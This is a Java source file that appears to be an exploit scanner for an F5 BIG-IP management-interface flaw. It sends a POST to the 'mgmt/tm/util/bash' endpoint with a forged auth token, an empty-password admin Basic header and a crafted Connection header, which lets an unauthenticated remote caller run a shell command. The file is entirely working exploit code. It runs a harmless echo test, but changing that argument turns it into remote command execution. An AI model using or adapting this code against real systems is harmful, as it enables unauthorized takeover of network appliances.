import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;

public class sendCommand {

	private String target;
	private static String line = null;
	private static final String endPoint = "mgmt/tm/util/bash";

	public sendCommand(String url) {
		this.target = url;
	}

	public void sendReq() throws Exception {

		System.out.println("[+] Scanning " + this.target);
		if (!this.target.endsWith("/")) {
			this.target = this.target + "/" + endPoint;
		} else if (this.target.endsWith("/")) {
			this.target = this.target + endPoint;
		}
		try {
			URL obj = new URL(this.target);
			HttpURLConnection con = (HttpURLConnection) obj.openConnection();
			con.setDoOutput(true);
			con.setDoInput(true);
			// con.setRequestProperty("Accept-Encoding:","gzip, deflate");
			con.setRequestProperty("Accept", "*/*");
			con.setRequestProperty("Connection",
					"close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host");
			con.setRequestProperty("Content-Type", "application/json");
			con.setRequestProperty("X-F5-Auth-Token", "anything");
			con.setRequestProperty("Authorization", "Basic YWRtaW46");
			con.setRequestMethod("POST");
			OutputStreamWriter wr = new OutputStreamWriter(con.getOutputStream());
			wr.write(JSON.HMQ(new HashMap<String, String>() {
				{
					put("command", "run");
					put("utilCmdArgs", "-c 'echo PwnMeSenpai'");
				}
			}));
			wr.flush();

			StringBuilder sB = new StringBuilder();
			BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
			while ((line = br.readLine()) != null) {
				sB.append(line + "\n");

			}
			br.close();
			String responseParsing = "" + sB.toString();

			String notFinalResult = JSON.QHM(responseParsing).get("commandResult");
			String finalResult = notFinalResult.replace("\n", "");

			if (finalResult.equals("PwnMeSenpai")) {
				System.out.println("[+] " + this.target + " ====> vulnerable.\n");

			} else {
				System.out.println("[-] " + this.target + " may not be vulnerable.");
				System.out.println("[-] Status code: " + con.getResponseCode());
				System.out.println("[-] Response data:\n" + responseParsing + "\n");
			}
		} catch (Exception e) {
			System.out.println(e);
			System.out.println("");
		}

	}

}
